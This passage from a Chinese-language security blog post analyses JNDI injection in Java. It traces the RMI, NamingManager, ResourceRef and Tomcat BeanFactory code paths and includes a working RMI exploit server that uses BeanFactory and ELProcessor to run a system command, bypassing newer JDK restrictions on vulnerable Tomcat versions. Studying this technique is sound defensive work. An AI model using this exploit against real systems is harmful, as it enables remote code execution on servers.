var22;</span><br><span class="line"><span class="comment">//上面那个ref为UnicastRef类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UnicastRef</span> <span class="keyword">implements</span> <span class="title">RemoteRef</span> </span>&#123;   </span><br><span class="line">     <span class="function"><span class="keyword">public</span> RemoteCall <span class="title">newCall</span><span class="params">(RemoteObject var1, Operation[] var2, <span class="keyword">int</span> var3, <span class="keyword">long</span> var4)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        clientRefLog.log(Log.BRIEF, <span class="string">&quot;get connection&quot;</span>);</span><br><span class="line">        Connection var6 = <span class="keyword">this</span>.ref.getChannel().newConnection();<span class="comment">//建立连接tcp socket</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            clientRefLog.log(Log.VERBOSE, <span class="string">&quot;create call context&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (clientCallLog.isLoggable(Log.VERBOSE)) &#123;</span><br><span class="line">                <span class="keyword">this</span>.logClientCall(var1, var2[var3]);</span><br><span class="line">            &#125;</span><br><span class="line">            StreamRemoteCall var7 = <span class="keyword">new</span> StreamRemoteCall(var6, <span class="keyword">this</span>.ref.getObjID(), var3, var4);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">this</span>.marshalCustomCallData(var7.getOutputStream());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException var9) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> MarshalException(<span class="string">&quot;error marshaling custom call data&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> var7; <span class="comment">//newCall返回StreamRemoteCall类    </span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">invoke</span><span class="params">(RemoteCall var1)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            clientRefLog.log(Log.VERBOSE, <span class="string">&quot;execute call&quot;</span>);</span><br><span class="line">            var1.executeCall();<span class="comment">//调用StreamRemoteCall类 的executeCall()方法  ,这个方法会异常结果反序列化读出来的              </span></span><br></pre></td></tr></table></figure>
<h5 id="NamingManager"><a href="#NamingManager" class="headerlink" title="NamingManager"></a>NamingManager</h5><p>javax.naming.spi.NamingManager是Java中提供了一些用于JNDI操作的静态方法的类。它位于javax.naming.spi包中，提供了一些静态方法来管理JNDI上下文工厂和对象实例化。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object</span></span><br><span class="line"><span class="function">        <span class="title">getObjectInstance</span><span class="params">(Object refInfo, Name name, Context nameCtx,</span></span></span><br><span class="line"><span class="params"><span class="function">                          Hashtable&lt;?,?&gt; environment)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">.....</span><br><span class="line">            Reference ref = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (refInfo <span class="keyword">instanceof</span> Reference) &#123;</span><br><span class="line">            ref = (Reference) refInfo;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (refInfo <span class="keyword">instanceof</span> Referenceable) &#123;</span><br><span class="line">            ref = ((Referenceable)(refInfo)).getReference();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ref != <span class="keyword">null</span>) &#123;<span class="comment">//如果传入的是refer则进入</span></span><br><span class="line">            String f = ref.getFactoryClassName();<span class="comment">//调用了获得refer的getFactoryClassName方法</span></span><br><span class="line">            <span class="keyword">if</span> (f != <span class="keyword">null</span>) &#123;</span><br><span class="line">                factory = getObjectFactoryFromReference(ref, f);</span><br><span class="line">                <span class="keyword">if</span> (factory != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> factory.getObjectInstance(ref, name, nameCtx,<span class="comment">//绕过点</span></span><br><span class="line">                                                     environment);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">.......</span><br><span class="line">&#125;&#125;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> ObjectFactory <span class="title">getObjectFactoryFromReference</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        Reference ref, String factoryName)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IllegalAccessException,</span></span><br><span class="line"><span class="function">        InstantiationException,</span></span><br><span class="line"><span class="function">        MalformedURLException </span>&#123;</span><br><span class="line">        Class&lt;?&gt; clas = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">             clas = helper.loadClass(factoryName);<span class="comment">//尝试本地加载</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        String codebase;</span><br><span class="line">        <span class="keyword">if</span> (clas == <span class="keyword">null</span> &amp;&amp;</span><br><span class="line">                (codebase = ref.getFactoryClassLocation()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                clas = helper.loadClass(factoryName, codebase);<span class="comment">// 尝试远程类，最后实现是通过 Class.forName(className, true, cl)，其中cl为自定义 URLClassLoader</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (clas != <span class="keyword">null</span>) ? (ObjectFactory) clas.newInstance() : <span class="keyword">null</span>;<span class="comment">//强转为ObjectFactory类型</span></span><br><span class="line">    &#125;              </span><br></pre></td></tr></table></figure>
<h4 id="基于BeanFactory的任意方法调用-tomcat依赖包-lt-8-5-85"><a href="#基于BeanFactory的任意方法调用-tomcat依赖包-lt-8-5-85" class="headerlink" title="基于BeanFactory的任意方法调用( tomcat依赖包&lt;8.5.85)"></a>基于BeanFactory的任意方法调用( tomcat依赖包&lt;8.5.85)</h4><p>在高版本中（如：JDK8u191以上版本）虽然不能从远程加载恶意的Factory，但是我们依然可以在返回的Reference中指定Factory Class，这个工厂类必须在受害目标本地的CLASSPATH中。工厂类必须实现 <strong>javax.naming.spi.ObjectFactory</strong> 接口，并且至少存在一个 <strong>getObjectInstance()</strong> 方法(在之前，远程类加载时用的Class.forName(className, true, cl)可以加载静态代码块，且在前面，后面报错了也没事)</p>
<p> Apache Tomcat中的<strong>org.apache.naming.factory.BeanFactory</strong> 刚好满足条件并且存在被利用的可能。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//利用代码</span></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMI_Server_ByPass</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        ResourceRef resourceRef = <span class="keyword">new</span> ResourceRef(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, (String)<span class="keyword">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="keyword">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, (String)<span class="keyword">null</span>);</span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;faster=eval&quot;</span>));</span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;faster&quot;</span>, <span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;)&quot;</span>));</span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(resourceRef);</span><br><span class="line">        registry.bind(<span class="string">&quot;Tomcat8bypass&quot;</span>, referenceWrapper);</span><br><span class="line">        System.out.println(<span class="string">&quot;Registry运行中......&quot;</span>);</span><br><span class="line"> <span class="comment">//实际上就相当于运行java.lang.Object javax.el.ELProcessor.eval(Runtime.getRuntime().exec(&quot;calc&quot;))</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h6 id="ResourceRef"><a href="#ResourceRef" class="headerlink" title="ResourceRef"></a>ResourceRef</h6><p>ResourceRef是Java中javax.naming.Reference的子类之一，它用于表示JNDI上下文中资源的引用。ResourceRef可以用来描述连接到数据库、消息队列等资源的引用。</p>
<p>ResourceRef对象通常由应用服务器（如Tomcat、WebLogic等）或其他JNDI容器自动生成，并与JNDI上下文相关联。在JNDI目录中，ResourceRef对象的名称通常映射到资源的JNDI名称。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ResourceRef</span> <span class="keyword">extends</span> <span class="title">Reference</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ResourceRef</span><span class="params">(String resourceClass, String description,</span></span></span><br><span class="line"><span class="params"><span class="function">                       String scope, String auth, <span class="keyword">boolean</span> singleton,</span></span></span><br><span class="line"><span class="params"><span class="function">                       String factory, String factoryLocation)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(resourceClass, factory, factoryLocation);<span class="comment">//调用Reference的构造方法</span></span><br><span class="line">        StringRefAddr refAddr = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (description != <span class="keyword">null</span>) &#123;</span><br><span class="line">            refAddr = <span class="keyword">new</span> StringRefAddr(DESCRIPTION, description);</span><br><span class="line">            add(refAddr);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (scope != <span class="keyword">null</span>) &#123;</span><br><span class="line">            refAddr = <span class="keyword">new</span> StringRefAddr(SCOPE, scope);</span><br><span class="line">            add(refAddr);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (auth != <span class="keyword">null</span>) &#123;</span><br><span class="line">            refAddr = <span class="keyword">new</span> StringRefAddr(AUTH, auth);</span><br><span class="line">            add(refAddr);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// singleton is a boolean so slightly different handling</span></span><br><span class="line">        refAddr = <span class="keyword">new</span> StringRefAddr(SINGLETON, Boolean.toString(singleton));</span><br><span class="line">        add(refAddr);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//下面是从Reference继承过来的</span></span><br><span class="line">    <span class="keyword">protected</span> Vector&lt;RefAddr&gt; addrs = <span class="keyword">null</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(RefAddr addr)</span> </span>&#123;</span><br><span class="line">        addrs.addElement(addr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> RefAddr <span class="title">get</span><span class="params">(String addrType)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = addrs.size();</span><br><span class="line">        RefAddr addr;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            addr = addrs.elementAt(i);</span><br><span class="line">            <span class="keyword">if</span> (addr.getType().compareTo(addrType) == <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> addr;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> Enumeration&lt;RefAddr&gt; <span class="title">getAll</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> addrs.elements();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//javax/naming/StringRefAddr.java ，在JNDI中，RefAddr用于存储引用对象中的某个特定属性的名称和值。</span></span><br><span class="line">    <span class="keyword">protected</span> String addrType;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">StringRefAddr</span><span class="params">(String addrType, String addr)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(addrType);<span class="comment">//赋给addrType</span></span><br><span class="line">        contents = addr;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getType</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> addrType;</span><br><span class="line">    &#125; </span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">getContent</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> contents;</span><br><span class="line">    &#125;  </span><br></pre></td></tr></table></figure>
<h6 id="org-apache-naming-factory-BeanFactory-java"><a href="#org-apache-naming-factory-BeanFactory-java" class="headerlink" title="org/apache/naming/factory/BeanFactory.java"></a>org/apache/naming/factory/BeanFactory.java</h6><p>org.apache.naming.factory.BeanFactory 类，这个类的getObjectInstance() 会通过反射的方式实例化Reference所指向的任意Bean Class，并且会调用setter方法为所有的属性赋值</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BeanFactory</span> <span class="keyword">implements</span> <span class="title">ObjectFactory</span> </span>&#123;</span><br><span class="line">     <span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx,</span></span></span><br><span class="line"><span class="params"><span class="function">                                    Hashtable&lt;?,?&gt; environment)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> ResourceRef) &#123;<span class="comment">//检测是否为ResourceRef</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Reference ref = (Reference) obj;<span class="comment">//转成Reference</span></span><br><span class="line">                String beanClassName = ref.getClassName();</span><br><span class="line">                Class&lt;?&gt; beanClass = <span class="keyword">null</span>;</span><br><span class="line">                ClassLoader tcl =</span><br><span class="line">                    Thread.currentThread().getContextClassLoader();</span><br><span class="line">                <span class="keyword">if</span> (tcl != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        beanClass = tcl.loadClass(beanClassName);                           <span class="comment">//1.根据自定义类名加载类</span></span><br><span class="line">                    &#125; <span class="keyword">catch</span>(ClassNotFoundException e) &#123;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              .....</span><br><span class="line">                Object bean = beanClass.newInstance();                                      <span class="comment">//2.实例化该类</span></span><br><span class="line">                RefAddr ra = ref.get(<span class="string">&quot;forceString&quot;</span>);<span class="comment">//查找addrType的值为forceString的RefAddr</span></span><br><span class="line">                Map&lt;String, Method&gt; forced = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">                String value;  </span><br><span class="line">                <span class="keyword">if</span> (ra != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    value = (String)ra.getContent();  </span><br><span class="line">                    Class&lt;?&gt; paramTypes[] = <span class="keyword">new</span> Class[<span class="number">1</span>];</span><br><span class="line">                    paramTypes[<span class="number">0</span>] = String.class;</span><br><span class="line">                    String setterName;</span><br><span class="line">                    <span class="keyword">int</span> index;</span><br><span class="line">                <span class="keyword">for</span> (String param: value.split(<span class="string">&quot;,&quot;</span>)) &#123;</span><br><span class="line">                        param = param.trim();</span><br><span class="line">                        index = param.indexOf(<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">                        <span class="keyword">if</span> (index &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                            setterName = param.substring(index + <span class="number">1</span>).trim();<span class="comment">//按=分隔值和键</span></span><br><span class="line">                            param = param.substring(<span class="number">0</span>, index).trim();</span><br><span class="line">                        &#125;    </span><br><span class="line">                .....</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            forced.put(param, beanClass.getMethod(setterName, paramTypes));<span class="comment">//3.利用方法名和参数列表获取方法,并将结果放到一个map中</span></span><br><span class="line">                        &#125; </span><br><span class="line">                .....</span><br><span class="line">                Enumeration&lt;RefAddr&gt; e = ref.getAll();<span class="comment">//获取所以的RefAddr</span></span><br><span class="line">                <span class="keyword">while</span> (e.hasMoreElements()) &#123;</span><br><span class="line"></span><br><span class="line">                    ra = e.nextElement();</span><br><span class="line">                    String propName = ra.getType();</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (propName.equals(Constants.FACTORY) ||</span><br><span class="line">                        propName.equals(<span class="string">&quot;scope&quot;</span>) || propName.equals(<span class="string">&quot;auth&quot;</span>) ||</span><br><span class="line">                        propName.equals(<span class="string">&quot;forceString&quot;</span>) ||</span><br><span class="line">                        propName.equals(<span class="string">&quot;singleton&quot;</span>)) &#123;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;<span class="comment">//根据RefAddr的addrType值不能为factory|scope|auth|forceString|singleton(本例是最后一个RefAddr)</span></span><br><span class="line">                    value = (String)ra.getContent();</span><br><span class="line">                    Object[] valueArray = <span class="keyword">new</span> Object[<span class="number">1</span>];</span><br><span class="line">                    Method method = forced.get(propName);         <span class="comment">//根据addrType值从map中提取方法         </span></span><br><span class="line">                    <span class="keyword">if</span> (method != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        valueArray[<span class="number">0</span>] = value;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            method.invoke(bean, valueArray);                                <span class="comment">//4.调用函数                           </span></span><br></pre></td></tr></table></figure>
<p>抛开各种逻辑限制不谈，这里的利用其实就是通过反射实现任意方法调用，这里<strong>要求要调用的类可以通过无参构造，调用的方法的参数数目为一且是String类型</strong></p>

        </div>

        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2023/11/13/java/Serializable/java%20%E5%9F%BA%E4%BA%8EBean%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/">java 基于Bean的反序列化链</a>
            
            
            <a class="next" rel="next" href="/2023/10/31/java/java_Springboot/">java_Springboot</a>
            
        </section>


    </article>
</div>

            </div>
            <footer id="footer" class="footer">
    <div class="copyright">
        <span>© mayylu | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

    </div>
</body>

</html>